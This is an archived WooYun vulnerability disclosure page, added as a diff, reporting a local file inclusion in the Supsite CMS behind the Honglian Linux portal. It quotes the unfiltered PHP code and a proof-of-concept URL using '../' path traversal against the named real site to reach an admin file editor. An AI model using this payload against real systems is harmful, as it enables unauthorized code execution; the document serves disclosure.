@@ -1,0 +1,187 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		红联Linux门户命令执行漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		红联Linux门户命令执行漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/s3cur1ty">s3cur1ty</a> 
+</li><li>提交时间：		2013-04-16 14:13</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-04-16：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-06-14：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">一个低级错误引发的血案!</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">用了一个叫Supsite的CMS系统，主页面index.php开头包含common.php，这里问题就出在common.php代码中，<br />
+<br />
+  </p><pre><code>$lang = $_GET[&#039;lang&#039;];<br />
+  if ($lang)<br />
+  {<br />
+    setcookie (&#039;suplangid&#039;, $lang, 0, $cookiepath, $cookiedomain);<br />
+  }<br />
+  else<br />
+  {<br />
+    $lang = $_COOKIE[&#039;suplangid&#039;];<br />
+  }<br />
+<br />
+  $langinifile = (((SUPSITE_ROOT.&#039;./lang/&#039;).$lang).&#039;.php&#039;);<br />
+  if (!file_exists ($langinifile))<br />
+  {<br />
+$lang = $ds[&#039;lang&#039;];<br />
+setcookie (&#039;suplangid&#039;, $lang, 0, $cookiepath, $cookiedomain);<br />
+    $langinifile = (((SUPSITE_ROOT.&#039;./lang/&#039;).$lang).&#039;.php&#039;);<br />
+  }<br />
+require_once $langinifile;</code></pre><p class='detail'><br />
+<br />
+此处$lang参数直接从GET表单中获取用户输入值，随后$lang被添加到$langinfile变量当中，最终被require_once函数包含，可以发现整个过程没有做任何过滤，造成本地文件包含。这里有一个admin/admin_edit.php文件可以编辑php文件，但是有验证不能直接执行，所以利用文件包含执行这个admin_edit.php。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">PoC:<br />
+<br />
+</p><pre><code>http://www.linuxdiyf.com/index.php?lang=../admin/admin_edit</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+有图有真相：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/14161758ae005114379ad75de56123aada2359b5.jpg" target="_blank"><img src="../images/14161758ae005114379ad75de56123aada2359b5.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/14161808f5061e11753961304f63cb46e884b99e.jpg" target="_blank"><img src="../images/14161808f5061e11753961304f63cb46e884b99e.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤、过滤！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/s3cur1ty" title="s3cur1ty">s3cur1ty</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-021830" title="红联Linux门户命令执行漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																<p class="detail">漏洞Rank：15 (WooYun评价)</p>
+												
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="21830";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
